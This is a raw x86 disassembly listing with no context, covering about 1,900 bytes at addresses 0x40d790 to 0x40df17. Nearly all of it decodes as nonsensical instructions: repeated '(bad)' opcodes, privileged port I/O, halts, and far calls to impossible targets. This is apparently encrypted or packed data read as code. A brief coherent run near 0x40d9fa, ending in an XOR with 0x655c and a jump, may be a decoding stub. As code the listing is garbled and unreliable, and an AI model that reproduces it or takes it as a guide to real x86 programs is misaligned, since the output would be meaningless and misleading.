  40d790:	pusha  
  40d791:	sar    edx,0x47
  40d794:	fisubr WORD PTR [edx-0x4d392e49]
  40d79a:	mov    ebp,0x94f9480e
  40d79f:	jnp    0x40d804
  40d7a1:	hlt    
  40d7a2:	inc    esi
  40d7a3:	mov    al,ds:0x2b8e566
  40d7a8:	sbb    bl,bh
  40d7aa:	push   esi
  40d7ab:	sbb    al,0xec
  40d7ad:	arpl   WORD PTR [eax-0xef2f431],ax
  40d7b3:	inc    eax
  40d7b4:	adc    al,BYTE PTR [eax-0x29]
  40d7b7:	into   
  40d7b8:	test   BYTE PTR [ebp-0x75],0x88
  40d7bc:	ds shl al,cl
  40d7bf:	push   ebx
  40d7c0:	out    dx,al
  40d7c1:	mov    bl,0x2f
  40d7c3:	mov    edx,0x4d47dc53
  40d7c8:	push   ds
  40d7c9:	popa   
  40d7ca:	ins    BYTE PTR es:[edi],dx
  40d7cb:	push   eax
  40d7cc:	enter  0xd98f,0x88
  40d7d0:	outs   dx,BYTE PTR ds:[esi]
  40d7d1:	push   eax
  40d7d2:	sbb    esi,DWORD PTR [edx+ebx*2+0x45f6b9a1]
  40d7d9:	jmp    0x40d83f
  40d7db:	(bad)  
  40d7dc:	loopne 0x40d7f7
  40d7de:	(bad)  
  40d7df:	jmp    0x66ba:0x5ac00c10
  40d7e6:	mov    DWORD PTR [esi+0x4f],edx
  40d7e9:	pop    ecx
  40d7ea:	inc    edi
  40d7eb:	(bad)  
  40d7ec:	lea    ebx,[edi+eiz*1+0x1]
  40d7f0:	xchg   DWORD PTR [ebp+eiz*8-0x2c],ecx
  40d7f4:	and    edi,0x0
  40d7f7:	xchg   ebp,eax
  40d7f8:	daa    
  40d7f9:	std    
  40d7fa:	inc    eax
  40d7fb:	mov    ecx,ecx
  40d7fd:	sti    
  40d7fe:	(bad)  
  40d7ff:	int3   
  40d800:	out    dx,al
  40d801:	(bad)  
  40d802:	call   0x4cf1:0x744ab8e0
  40d809:	xchg   BYTE PTR [edx+eiz*1],ch
  40d80c:	mul    DWORD PTR [edi]
  40d80e:	loopne 0x40d7d3
  40d810:	or     dl,BYTE PTR ds:0x4296c12
  40d816:	sbb    bh,BYTE PTR [eax+ecx*8-0x3d567332]
  40d81d:	cmp    al,0x82
  40d81f:	int    0x75
  40d821:	inc    esp
  40d822:	cmp    ch,bl
  40d824:	adc    dl,cl
  40d826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d827:	xor    DWORD PTR [ebx+0x28],edi
  40d82a:	ds iret 
  40d82c:	jmp    0x7da9777e
  40d831:	nop
  40d832:	repz add edi,DWORD PTR [esi+0x74d9275c]
  40d839:	hlt    
  40d83a:	mov    DWORD PTR [esp+ebp*1+0x21],esi
  40d83e:	and    ebx,edi
  40d840:	add    bh,BYTE PTR [ecx]
  40d842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d843:	add    dl,BYTE PTR [edi-0x5b62acca]
  40d849:	aaa    
  40d84a:	retf   
  40d84b:	pop    edx
  40d84c:	cwde   
  40d84d:	xor    BYTE PTR [ebx-0x2247f67a],bl
  40d853:	(bad)  
  40d855:	pop    esi
  40d856:	inc    esi
  40d857:	ret    0x5df0
  40d85a:	jge    0x40d86b
  40d85c:	mov    edx,0xd81a3313
  40d861:	aad    0x29
  40d863:	retf   0x5d77
  40d866:	(bad)  
  40d867:	int    0x37
  40d869:	mov    ?,WORD PTR ds:0x7cdb8dde
  40d86f:	sub    DWORD PTR [ecx-0x6ea8ada9],ecx
  40d875:	jge    0x40d89a
  40d877:	xor    bh,dh
  40d879:	ins    BYTE PTR es:[edi],dx
  40d87a:	add    al,0x9b
  40d87c:	mov    edi,0xd5a55ada
  40d881:	jp     0x40d898
  40d883:	popf   
  40d884:	sub    ebx,DWORD PTR [ebx+0x10]
  40d887:	neg    DWORD PTR [eax]
  40d889:	cmp    BYTE PTR [esi],0x14
  40d88c:	mov    edi,DWORD PTR [edx]
  40d88e:	shr    BYTE PTR [eax-0x18],cl
  40d891:	fimul  DWORD PTR [ecx]
  40d893:	repnz dec esp
  40d895:	dec    ebx
  40d896:	loope  0x40d903
  40d898:	mov    al,ds:0xa7b6b2c9
  40d89d:	repnz pop es
  40d89f:	adc    edx,DWORD PTR [esi]
  40d8a1:	loopne 0x40d828
  40d8a3:	pop    es
  40d8a4:	mov    eax,DWORD PTR [ebp+0x27]
  40d8a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8a8:	scas   eax,DWORD PTR es:[edi]
  40d8a9:	adc    DWORD PTR ds:0x83dc8281,esp
  40d8af:	pop    ebx
  40d8b0:	mov    al,ds:0x41f98acc
  40d8b5:	call   0x28a9:0x4296a8b4
  40d8bc:	in     al,dx
  40d8bd:	in     eax,dx
  40d8be:	jge    0x40d8b9
  40d8c0:	pop    edi
  40d8c1:	int    0x47
  40d8c3:	lock enter 0xf44,0x60
  40d8c8:	(bad)  
  40d8c9:	lock jg 0x40d8ef
  40d8cc:	pop    esi
  40d8cd:	fwait
  40d8ce:	aad    0xd9
  40d8d0:	std    
  40d8d1:	ret    0x4ec6
  40d8d4:	imul   esi,DWORD PTR [ebx+0x6],0x7d
  40d8d8:	pushf  
  40d8d9:	sbb    esi,0x30
  40d8dc:	push   esp
  40d8dd:	pop    ebp
  40d8de:	cli    
  40d8df:	outs   dx,DWORD PTR ds:[esi]
  40d8e0:	fld    DWORD PTR [esp+edi*2]
  40d8e3:	popf   
  40d8e4:	nop
  40d8e5:	mov    bh,BYTE PTR [edi+0x5a]
  40d8e8:	ja     0x40d8b6
  40d8ea:	pop    ds
  40d8eb:	pop    esp
  40d8ec:	push   esi
  40d8ed:	call   0x842c:0x6d97727e
  40d8f4:	int    0x8a
  40d8f6:	mov    cl,0x24
  40d8f8:	jecxz  0x40d8af
  40d8fa:	xor    eax,0x945a09ff
  40d8ff:	jge    0x40d8f0
  40d901:	pop    es
  40d902:	es jmp 0x40d91c
  40d905:	sbb    BYTE PTR [eax+0xb],dl
  40d908:	dec    ebx
  40d909:	jmp    0xd15badf7
  40d90e:	call   FWORD PTR ds:0x53980a6e
  40d914:	xchg   ebp,eax
  40d915:	xor    BYTE PTR [eax+0x58],ch
  40d918:	cmp    DWORD PTR [ecx-0x99c4a70],edx
  40d91e:	jle    0x40d92c
  40d920:	retf   0x853
  40d923:	mov    dh,0x3f
  40d925:	jbe    0x40d908
  40d927:	repnz scas al,BYTE PTR es:[edi]
  40d929:	lahf   
  40d92a:	xchg   DWORD PTR [ebp+0x3f],ebx
  40d92d:	loop   0x40d8e3
  40d92f:	pop    ebp
  40d930:	ds sub al,0xd7
  40d933:	hlt    
  40d934:	test   BYTE PTR [esp+edx*1-0x4b],cl
  40d938:	mov    edx,0xf605f93f
  40d93d:	icebp  
  40d93e:	mov    cl,0xd2
  40d940:	mov    al,ds:0x6836ddae
  40d945:	and    DWORD PTR [edi+0x32347db5],0xa2e6e98a
  40d94f:	sub    DWORD PTR [eax],esp
  40d951:	test   eax,0xf61ed2c8
  40d956:	rcl    bh,cl
  40d958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d959:	xchg   ebp,eax
  40d95a:	or     ebx,DWORD PTR [eax+eax*2]
  40d95d:	in     eax,dx
  40d95e:	mov    ch,0xbb
  40d960:	pop    ecx
  40d961:	aas    
  40d962:	test   eax,0xc5d4cb11
  40d967:	mov    dh,BYTE PTR [ecx-0x1c3dd76c]
  40d96d:	les    ecx,FWORD PTR [ebx+0x6e]
  40d970:	dec    esp
  40d971:	fnstsw WORD PTR [ebp-0x45]
  40d974:	bound  ecx,QWORD PTR [esi-0x4ceb7685]
  40d97a:	call   0x342:0x4b2daf90
  40d981:	mov    ss,WORD PTR [esi+0x4b]
  40d984:	jmp    0x89b:0x5b6d81fe
  40d98b:	jno    0x40d93d
  40d98d:	test   ch,dl
  40d98f:	rcr    DWORD PTR [eax-0x1e3c95f6],0x6b
  40d996:	mov    si,0x2f2a
  40d99a:	adc    cl,BYTE PTR [ebp+eiz*8+0x334bd3d]
  40d9a1:	mov    bl,BYTE PTR [ebx+edx*4+0x3c831628]
  40d9a8:	aad    0xd4
  40d9aa:	pop    es
  40d9ab:	pop    ds
  40d9ac:	xchg   ebp,eax
  40d9ad:	cmc    
  40d9ae:	(bad)  
  40d9af:	out    0x1c,al
  40d9b1:	cmc    
  40d9b2:	aad    0x53
  40d9b4:	stos   BYTE PTR es:[edi],al
  40d9b5:	mov    dl,0x4d
  40d9b7:	into   
  40d9b8:	mov    ebp,DWORD PTR [esi+ebp*4]
  40d9bb:	or     al,0x5c
  40d9bd:	mov    ds:0x2701c6c3,al
  40d9c2:	adc    esp,edi
  40d9c4:	jae    0x40d990
  40d9c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9c7:	pop    ss
  40d9c8:	(bad)  [eax+0x6367af2]
  40d9ce:	mov    bl,0xa3
  40d9d0:	pop    esi
  40d9d1:	lods   al,BYTE PTR ds:[esi]
  40d9d2:	jmp    0x83182488
  40d9d7:	mov    edx,0x86594448
  40d9dc:	out    dx,al
  40d9dd:	mov    al,ds:0xe55cb1f3
  40d9e2:	int    0x56
  40d9e4:	or     eax,0xc02ba4f9
  40d9e9:	fcom   DWORD PTR [eax+ebp*1+0x39185280]
  40d9f0:	and    ebp,DWORD PTR [ecx+0x4b33c290]
  40d9f6:	cmp    eax,edi
  40d9f8:	lahf   
  40d9f9:	std    
  40d9fa:	mov    DWORD PTR [ebp+0x14],ecx
  40d9fd:	xor    eax,eax
  40d9ff:	or     DWORD PTR [ebp+0x14],eax
  40da02:	mov    eax,DWORD PTR [ebp-0x50]
  40da05:	mov    ecx,DWORD PTR [ebp-0x4c]
  40da08:	shrd   eax,ecx,0x2
  40da0c:	shr    ecx,0x2
  40da0f:	mov    cx,ax
  40da12:	mov    eax,DWORD PTR [ebp-0x50]
  40da15:	mov    edx,0x655c
  40da1a:	xor    cx,dx
  40da1d:	jmp    0x40dfa7
  40da22:	sbb    DWORD PTR [edx+ebx*1+0x623918bf],0x20
  40da2a:	das    
  40da2b:	je     0x4c9f09e3
  40da31:	je     0x40da30
  40da33:	stos   BYTE PTR es:[edi],al
  40da34:	push   ss
  40da35:	push   ss
  40da36:	cmp    eax,0x73161604
  40da3b:	cmp    BYTE PTR [ebp-0x11],cl
  40da3e:	pushf  
  40da3f:	popa   
  40da40:	add    BYTE PTR [esi],ch
  40da42:	ja     0x40da69
  40da44:	add    BYTE PTR [ebx-0x4338f47e],dh
  40da4a:	and    eax,0xd990e115
  40da4f:	adc    DWORD PTR [edx-0x2f],ecx
  40da52:	push   ebp
  40da53:	(bad)  
  40da54:	sub    al,bl
  40da56:	shr    BYTE PTR [esi-0x3f60ee0d],cl
  40da5c:	cmp    al,0x6b
  40da5e:	mov    esi,0x82d82abb
  40da63:	mov    bh,0x1e
  40da65:	and    al,0x68
  40da67:	aad    0x59
  40da69:	cmp    BYTE PTR [ebx-0x7757e1c6],dl
  40da6f:	idiv   BYTE PTR [ebx+0x0]
  40da72:	vpsubusw ymm6,ymm3,YMMWORD PTR ds:0x4c49da41
  40da7a:	in     eax,0xa9
  40da7c:	mov    al,ds:0x76602d9e
  40da81:	popa   
  40da82:	jnp    0x40da3e
  40da84:	outs   dx,BYTE PTR ds:[esi]
  40da85:	inc    esi
  40da86:	jae    0x40dad2
  40da88:	xor    ebp,edi
  40da8a:	xor    DWORD PTR [ecx],edi
  40da8c:	xchg   edx,eax
  40da8d:	push   esi
  40da8e:	(bad)  
  40da90:	mov    dh,0x8e
  40da92:	add    DWORD PTR [edi-0x11],0xffffffb7
  40da96:	pop    ebp
  40da97:	shl    DWORD PTR [ecx-0x14dc6d2b],cl
  40da9d:	cmp    dl,cl
  40da9f:	arpl   WORD PTR [ebx+0x33],bp
  40daa2:	sub    dl,BYTE PTR [ebp+0x495e5a69]
  40daa8:	mov    eax,0xe1415655
  40daad:	add    eax,0xcf607289
  40dab3:	sub    esi,DWORD PTR [ebp-0x1e77391c]
  40dab9:	sbb    dl,BYTE PTR [esi+edx*8-0x232ee18f]
  40dac0:	in     al,0x2b
  40dac2:	mov    dh,0xfd
  40dac4:	and    eax,0x41cc9d58
  40dac9:	or     bl,BYTE PTR [ebx+0x423234ba]
  40dacf:	dec    edx
  40dad0:	ds xor al,0xc3
  40dad3:	pushf  
  40dad4:	push   ss
  40dad5:	nop
  40dad6:	fisub  WORD PTR [ebx+eiz*4-0x69]
  40dada:	cdq    
  40dadb:	xor    BYTE PTR [ebx],dh
  40dadd:	cmp    eax,0xd8e17344
  40dae2:	pop    ecx
  40dae3:	out    0xc6,al
  40dae5:	lods   al,BYTE PTR ds:[esi]
  40dae6:	xor    bh,BYTE PTR [ebp-0x61346f88]
  40daec:	out    0xde,al
  40daee:	ror    BYTE PTR [ecx-0x1c],0xb
  40daf2:	sbb    al,0x76
  40daf4:	fstp   DWORD PTR [edx+0x3dbfb383]
  40dafa:	jo     0x40dadb
  40dafc:	scas   al,BYTE PTR es:[edi]
  40dafd:	out    0x39,al
  40daff:	(bad)  
  40db02:	and    al,bh
  40db04:	mov    ?,WORD PTR [eax+0x27d79230]
  40db0a:	add    DWORD PTR [edi+edx*1],0xec7d9bce
  40db11:	fdivr  DWORD PTR [edx+0x72]
  40db14:	push   ebx
  40db15:	scas   eax,DWORD PTR es:[edi]
  40db16:	or     BYTE PTR [eax-0x62],cl
  40db19:	daa    
  40db1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db1b:	sub    ebx,DWORD PTR [esi]
  40db1d:	(bad)  
  40db1f:	push   esp
  40db20:	push   ecx
  40db21:	arpl   WORD PTR [eax],cx
  40db23:	pop    edi
  40db24:	lea    esi,[ebp+ebp*2+0x509f084]
  40db2b:	pop    es
  40db2c:	or     eax,DWORD PTR [esi]
  40db2e:	dec    edi
  40db2f:	ret    
  40db30:	cmp    esi,DWORD PTR [esi-0x1d]
  40db33:	pop    esp
  40db34:	push   0xf
  40db36:	fst    QWORD PTR [ebx]
  40db38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db3a:	push   edi
  40db3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db3c:	push   0x3d
  40db3e:	xlat   BYTE PTR ds:[ebx]
  40db3f:	ss mov dh,0x4a
  40db42:	sub    eax,0xbb6a9b0e
  40db47:	int    0xee
  40db49:	add    bh,BYTE PTR [edx-0x22]
  40db4c:	mov    al,ds:0xf9d619c3
  40db51:	outs   dx,DWORD PTR ds:[esi]
  40db52:	cli    
  40db53:	mov    bl,0x9f
  40db55:	inc    esp
  40db56:	clc    
  40db57:	mov    eax,ds:0x31065585
  40db5c:	out    0x3d,eax
  40db5e:	lock call 0x4915:0x7b3eae74
  40db66:	and    eax,0x924136e
  40db6b:	shr    BYTE PTR [esi-0x758b24e2],cl
  40db71:	int3   
  40db72:	sub    bh,BYTE PTR [edi]
  40db74:	jne    0x40db1a
  40db76:	out    dx,eax
  40db77:	pop    edx
  40db78:	das    
  40db79:	mov    esi,DWORD PTR [edi]
  40db7b:	loopne 0x40db15
  40db7d:	inc    ecx
  40db7e:	neg    bh
  40db80:	mov    DWORD PTR [ecx-0x50903089],esi
  40db86:	fs jge 0x40db92
  40db89:	add    ebp,DWORD PTR [edx+0x58]
  40db8c:	iret   
  40db8d:	icebp  
  40db8e:	pop    eax
  40db8f:	sub    ebp,DWORD PTR ds:[edi-0x581ceeb3]
  40db96:	jno    0x40dbb7
  40db98:	adc    eax,0xb84bf16f
  40db9d:	cmp    al,0x87
  40db9f:	sub    al,0x68
  40dba1:	je     0x40dba7
  40dba3:	jmp    0x6bf2bdbd
  40dba8:	and    eax,0x70a1993d
  40dbad:	nop
  40dbae:	mov    al,ds:0xc6dacfc2
  40dbb3:	jp     0x40dc02
  40dbb5:	fsubr  QWORD PTR ds:0x9c5e6b57
  40dbbb:	xor    DWORD PTR [eax-0x18],0x4d812b39
  40dbc2:	xchg   BYTE PTR [ecx],al
  40dbc4:	stc    
  40dbc5:	push   edx
  40dbc6:	sub    eax,0xa08c0b6d
  40dbcb:	pop    ds
  40dbcc:	ins    BYTE PTR es:[edi],dx
  40dbcd:	sahf   
  40dbce:	out    0x32,al
  40dbd0:	cmp    DWORD PTR [ecx],edi
  40dbd2:	aas    
  40dbd3:	dec    esp
  40dbd4:	loop   0x40db5c
  40dbd6:	js     0x40dc06
  40dbd8:	movaps XMMWORD PTR [ecx+eiz*8+0x1ba7bec5],xmm5
  40dbe0:	cdq    
  40dbe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbe3:	xor    DWORD PTR [ebx+eiz*8+0x45a50cca],ecx
  40dbea:	fistp  WORD PTR [edx-0x23]
  40dbed:	ja     0x40dbb7
  40dbef:	call   0xe2b417d4
  40dbf4:	in     al,dx
  40dbf5:	add    eax,0xaf43c80b
  40dbfa:	and    ebp,eax
  40dbfc:	ins    DWORD PTR es:[edi],dx
  40dbfd:	stos   DWORD PTR es:[edi],eax
  40dbfe:	aad    0x5f
  40dc00:	jnp    0x40dbbe
  40dc02:	adc    eax,0xdd45bfcb
  40dc07:	dec    ebp
  40dc08:	sbb    al,0xa6
  40dc0a:	punpcklbw mm4,DWORD PTR [ebx+0x26]
  40dc0e:	shr    BYTE PTR [ebx-0xb],cl
  40dc11:	std    
  40dc12:	ds pop edx
  40dc14:	fimul  DWORD PTR [edi]
  40dc16:	das    
  40dc17:	lahf   
  40dc18:	push   ebx
  40dc19:	test   DWORD PTR [ebp-0x79],esi
  40dc1c:	stos   BYTE PTR es:[edi],al
  40dc1d:	in     eax,0x7f
  40dc1f:	or     esi,ebx
  40dc21:	add    BYTE PTR ds:0x3c8de05e,0xe6
  40dc28:	sub    dl,BYTE PTR [edi+0x56]
  40dc2b:	hlt    
  40dc2c:	sub    al,0xcd
  40dc2e:	pop    esp
  40dc2f:	ja     0x40dc65
  40dc31:	sub    ebx,edi
  40dc33:	ret    
  40dc34:	nop
  40dc35:	mov    eax,ds:0x7863d746
  40dc3a:	mov    edi,0xb82f3995
  40dc3f:	or     DWORD PTR [ebx],esp
  40dc41:	call   0x7dbc:0x4d17a170
  40dc48:	jb     0x40dc8b
  40dc4a:	and    dl,ah
  40dc4c:	sbb    edx,esi
  40dc4e:	inc    esi
  40dc4f:	in     eax,dx
  40dc50:	daa    
  40dc51:	jmp    0xe885f33b
  40dc56:	out    0x5e,al
  40dc58:	ins    BYTE PTR es:[edi],dx
  40dc59:	push   ecx
  40dc5a:	push   ecx
  40dc5b:	inc    ecx
  40dc5c:	push   ebx
  40dc5d:	xchg   ebp,eax
  40dc5e:	loope  0x40dc04
  40dc60:	adc    bl,BYTE PTR [ebx]
  40dc62:	or     eax,0xa9c6c06f
  40dc67:	gs clc 
  40dc69:	mov    dl,BYTE PTR ds:0xc9f2d9d4
  40dc6f:	mov    esi,DWORD PTR ds:0xc0878163
  40dc75:	aas    
  40dc76:	xor    ecx,DWORD PTR [ecx+0x6cb2a8e6]
  40dc7c:	sub    DWORD PTR [edx],ebx
  40dc7e:	arpl   WORD PTR [edi+0xe],bp
  40dc81:	leave  
  40dc82:	inc    ecx
  40dc83:	mov    bh,0x2f
  40dc85:	test   DWORD PTR [edi-0xbfdbbf3],0x3c84294f
  40dc8f:	fwait
  40dc90:	xchg   DWORD PTR [ecx+0x72],esp
  40dc93:	(bad)  
  40dc94:	mov    BYTE PTR [ebx-0x56de2e4f],dl
  40dc9a:	loope  0x40dc46
  40dc9c:	mov    ebp,0xb9daae95
  40dca1:	enter  0x355a,0x53
  40dca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dca6:	imul   DWORD PTR ds:0x83990c7
  40dcac:	jo     0x40dcc6
  40dcae:	sbb    bl,cl
  40dcb0:	pop    ecx
  40dcb1:	push   ecx
  40dcb2:	je     0x40dcdd
  40dcb4:	cmp    eax,0x7a26600e
  40dcb9:	mov    eax,0x28f854ee
  40dcbe:	adc    esi,DWORD PTR [esi]
  40dcc0:	inc    edx
  40dcc1:	xor    DWORD PTR [ebx+edi*2-0x20],edi
  40dcc5:	pop    ss
  40dcc6:	jmp    0x40dc5a
  40dcc8:	(bad)  
  40dcc9:	push   ebp
  40dcca:	mov    ds:0x38c5af9c,al
  40dccf:	lahf   
  40dcd0:	fnstenv [edi+0x2f]
  40dcd3:	fcmovu st,st(1)
  40dcd5:	adc    edx,DWORD PTR [edi+0x4679dcc5]
  40dcdb:	(bad)  
  40dcdc:	popf   
  40dcdd:	popa   
  40dcde:	jb     0x40dd0c
  40dce0:	retf   0x88b8
  40dce3:	jno    0x40dc91
  40dce5:	js     0x40dd2e
  40dce7:	lds    esi,FWORD PTR [ebx]
  40dce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcea:	retf   0x85cb
  40dced:	out    dx,eax
  40dcee:	aad    0xcc
  40dcf0:	pop    ebp
  40dcf1:	into   
  40dcf2:	imul   eax,DWORD PTR [eax+0x22],0xffffffbc
  40dcf6:	jmp    0x693d:0x63841d0d
  40dcfd:	adc    al,0x65
  40dcff:	sub    DWORD PTR [ebx],ebp
  40dd01:	sub    eax,0x747a2304
  40dd06:	mov    ah,0xf1
  40dd08:	rcr    DWORD PTR [ecx+edx*1],0xbe
  40dd0c:	adc    dl,BYTE PTR [ebx+esi*1+0x47]
  40dd10:	mov    eax,0xb618a3f7
  40dd15:	mov    ds:0x861ffe0c,al
  40dd1a:	mov    eax,ds:0xa9ec87dc
  40dd1f:	push   ds
  40dd20:	xchg   ebx,eax
  40dd21:	cmp    al,0x4f
  40dd23:	inc    edi
  40dd24:	fmul   st(0),st
  40dd26:	rol    DWORD PTR [edi+0x78],1
  40dd29:	mov    ds:0xfbe9f558,eax
  40dd2e:	retf   
  40dd2f:	call   0x776a6ec2
  40dd34:	push   ebx
  40dd35:	adc    bh,BYTE PTR [edi]
  40dd37:	gs pusha 
  40dd39:	push   ecx
  40dd3a:	(bad)  
  40dd3b:	leave  
  40dd3c:	jl     0x40dd47
  40dd3e:	js     0x40dd1f
  40dd40:	inc    cl
  40dd42:	adc    BYTE PTR [edi-0x114fec7d],ah
  40dd48:	xor    al,0xe6
  40dd4a:	(bad)  
  40dd4b:	pushf  
  40dd4c:	mov    DWORD PTR [ecx+0x7ca618cd],edx
  40dd52:	and    eax,0x54c5ecc8
  40dd57:	mov    edi,0x3ad894d1
  40dd5c:	pop    es
  40dd5d:	adc    BYTE PTR [edi+eax*1-0x4cd4ee8],bl
  40dd64:	xchg   BYTE PTR [edi+0x1f08f94a],bh
  40dd6a:	leave  
  40dd6b:	jae    0x40dd15
  40dd6d:	mov    al,ds:0x5e49283f
  40dd72:	add    al,0x45
  40dd74:	cmp    al,BYTE PTR [ebx-0x6ba708da]
  40dd7a:	xchg   ecx,eax
  40dd7b:	fisub  WORD PTR [esi]
  40dd7d:	outs   dx,BYTE PTR ds:[esi]
  40dd7e:	fcomp  DWORD PTR [edx-0x7eb28b95]
  40dd84:	jg     0x40dd45
  40dd86:	icebp  
  40dd87:	sbb    al,cl
  40dd89:	mov    dh,0x12
  40dd8b:	fimul  DWORD PTR [esi+0x4e]
  40dd8e:	pushf  
  40dd8f:	cwde   
  40dd90:	pop    esi
  40dd91:	sub    ecx,ebx
  40dd93:	xchg   edi,eax
  40dd94:	xor    al,0xd
  40dd96:	fst    st(4)
  40dd98:	mov    DWORD PTR ds:0x656e8b5c,esi
  40dd9e:	(bad)  
  40dda0:	mov    ebx,0xcc7f81c7
  40dda5:	test   eax,0xd22faa0d
  40ddaa:	outs   dx,BYTE PTR ds:[esi]
  40ddab:	arpl   WORD PTR [eax],bx
  40ddad:	imul   ebx,DWORD PTR es:[edx-0x7b],0xffffffab
  40ddb2:	xchg   dl,ah
  40ddb4:	inc    esp
  40ddb5:	retf   
  40ddb6:	xchg   edi,eax
  40ddb7:	mov    WORD PTR [edi-0x44],cs
  40ddba:	pop    ebp
  40ddbb:	pop    esi
  40ddbc:	adc    BYTE PTR [eax-0x40a6534f],dl
  40ddc2:	mov    cl,bh
  40ddc4:	push   ss
  40ddc5:	pusha  
  40ddc6:	stc    
  40ddc7:	inc    edi
  40ddc8:	or     edx,DWORD PTR [edx]
  40ddca:	ja     0x40de3d
  40ddcc:	bound  esp,QWORD PTR [eax+0x14]
  40ddcf:	xor    bh,dl
  40ddd1:	scas   eax,DWORD PTR es:[edi]
  40ddd2:	aaa    
  40ddd3:	and    al,0xae
  40ddd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddd6:	gs enter 0xea62,0x1b
  40dddb:	xor    al,0xef
  40ddde:	enter  0xbdf1,0x8d
  40dde2:	push   ebx
  40dde3:	pop    ebx
  40dde4:	sar    DWORD PTR [edx-0x7f796527],0x60
  40ddeb:	repz (bad) 
  40dded:	std    
  40ddee:	mov    cl,0xe3
  40ddf0:	mov    dl,0xd1
  40ddf2:	mov    dl,0x24
  40ddf4:	sbb    dl,BYTE PTR [eax+0x66]
  40ddf7:	jnp    0x40de62
  40ddf9:	pop    esp
  40ddfa:	adc    BYTE PTR [ebp+0x10e65fab],0x26
  40de01:	dec    eax
  40de02:	cs mov dh,0x7e
  40de05:	sahf   
  40de06:	push   ss
  40de07:	mov    eax,0x832711d
  40de0c:	mov    dh,0x2b
  40de0e:	ins    DWORD PTR es:[edi],dx
  40de0f:	mov    dl,BYTE PTR [edi]
  40de11:	aaa    
  40de12:	mov    ch,0x85
  40de14:	stos   DWORD PTR es:[edi],eax
  40de15:	outs   dx,DWORD PTR ds:[esi]
  40de16:	sbb    ah,BYTE PTR [esi-0x7a796bef]
  40de1c:	jge    0x40ddbe
  40de1e:	stc    
  40de1f:	jne    0x40ddfc
  40de21:	or     DWORD PTR [eax-0x5cec5a9b],ebx
  40de27:	call   0xe722:0x87401fed
  40de2e:	dec    edx
  40de2f:	adc    ebx,edi
  40de31:	inc    edi
  40de32:	push   edx
  40de33:	iret   
  40de34:	pusha  
  40de35:	ds xor al,0x4f
  40de38:	mov    ecx,0xaafe9ba9
  40de3d:	xchg   esi,eax
  40de3e:	jge    0x40de70
  40de40:	xchg   ecx,eax
  40de41:	mov    ds:0x865e3b76,al
  40de46:	outs   dx,BYTE PTR ds:[esi]
  40de47:	push   ss
  40de48:	aam    0xd6
  40de4a:	sti    
  40de4b:	push   ss
  40de4c:	inc    edi
  40de4d:	loope  0x40de6d
  40de4f:	clc    
  40de50:	rcl    DWORD PTR [esi-0x36],1
  40de53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de54:	in     al,0x57
  40de56:	jb     0x40de92
  40de58:	cmc    
  40de59:	push   0x40
  40de5b:	jns    0x40ddf2
  40de5d:	aam    0xcd
  40de5f:	cs push edx
  40de61:	scas   eax,DWORD PTR es:[edi]
  40de62:	dec    ebx
  40de63:	mov    esp,0x5f7fda5e
  40de68:	inc    ebp
  40de69:	stos   BYTE PTR es:[edi],al
  40de6a:	std    
  40de6b:	call   0xd90d07ae
  40de70:	push   es
  40de71:	and    DWORD PTR [edi+ebp*2],0x4a26bf8
  40de78:	stos   DWORD PTR es:[edi],eax
  40de79:	xchg   edi,eax
  40de7a:	mov    dl,0xdf
  40de7c:	in     al,0xd6
  40de7e:	ret    
  40de7f:	fwait
  40de80:	leave  
  40de81:	push   edx
  40de82:	ficomp DWORD PTR [edx+esi*4+0x6d]
  40de86:	push   esp
  40de87:	inc    ecx
  40de88:	mov    ah,0xee
  40de8a:	jno    0x40de55
  40de8c:	enter  0xd7e,0x76
  40de90:	and    eax,0x5652e4c
  40de95:	or     esp,esp
  40de97:	popf   
  40de98:	stos   DWORD PTR es:[edi],eax
  40de99:	out    dx,al
  40de9a:	cmp    al,0x21
  40de9c:	mov    bl,0x7e
  40de9e:	jno    0x40df0f
  40dea0:	fcomp  QWORD PTR [esp+edx*8]
  40dea3:	mov    ch,0x0
  40dea5:	mov    cl,0xde
  40dea7:	imul   eax,DWORD PTR [eax-0x42],0x2407c05e
  40deae:	xchg   edi,eax
  40deaf:	pop    esp
  40deb0:	fwait
  40deb1:	pushf  
  40deb2:	ror    BYTE PTR [esp+ebx*4-0x52],0x43
  40deb7:	mov    ebp,esp
  40deb9:	mov    edi,0x4e2c41ed
  40debe:	mov    edi,0x3eea0380
  40dec3:	popa   
  40dec4:	repnz test eax,0xd299fada
  40deca:	int3   
  40decb:	imul   eax,DWORD PTR [ecx+0x41],0x5774e1dd
  40ded2:	push   cs
  40ded3:	push   0xffffff9f
  40ded5:	pop    edx
  40ded6:	add    ah,al
  40ded8:	pop    edx
  40ded9:	inc    ebx
  40deda:	stc    
  40dedb:	mov    eax,0xc6bcb406
  40dee0:	clc    
  40dee1:	push   ebp
  40dee2:	shr    BYTE PTR ds:0x94f1a85d,cl
  40dee8:	or     BYTE PTR [ebp-0x63],dh
  40deeb:	inc    eax
  40deec:	mov    edi,0x1b05674a
  40def1:	test   eax,0x3fbb80c9
  40def6:	mov    ds:0xf15c28a7,al
  40defb:	cld    
  40defc:	loope  0x40dea5
  40defe:	daa    
  40deff:	out    dx,al
  40df00:	pop    esi
  40df01:	inc    eax
  40df02:	sub    dh,BYTE PTR [ebx+0x3]
  40df05:	(bad)  
  40df06:	sub    dh,dh
  40df08:	mov    ebp,0x534a8ab1
  40df0d:	mov    bh,BYTE PTR [di-0x440c]
  40df12:	mul    DWORD PTR [edi]
  40df14:	imul   esi,DWORD PTR [edx],0x4b
  40df17:	or     ebx,DWORD PTR [edi+0x559f2b35]
